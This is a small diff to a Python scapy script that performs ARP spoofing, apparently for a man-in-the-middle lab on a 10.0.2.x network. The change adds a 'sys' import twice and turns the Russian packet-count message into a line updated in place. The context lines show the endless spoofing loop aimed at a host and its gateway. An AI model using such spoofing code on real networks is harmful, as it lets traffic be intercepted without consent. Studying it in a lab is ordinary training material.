@@ -1,7 +1,9 @@
 #!/usr/bin/env python
+import sys
 
 import scapy.all as scapy
 import time
+import sys
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -22,5 +24,6 @@ while True:
     spoof("10.0.2.7", "10.0.2.1")
     spoof("10.0.2.1", "10.0.2.7")
     send_packets_count = send_packets_count + 2
-    print("[+] Отправлено пакетов: " + str(send_packets_count) + " шт.")
+    print("\r[+] Отправлено пакетов: " + str(send_packets_count), end="")
+    sys.stdout.flush()
     time.sleep(2)
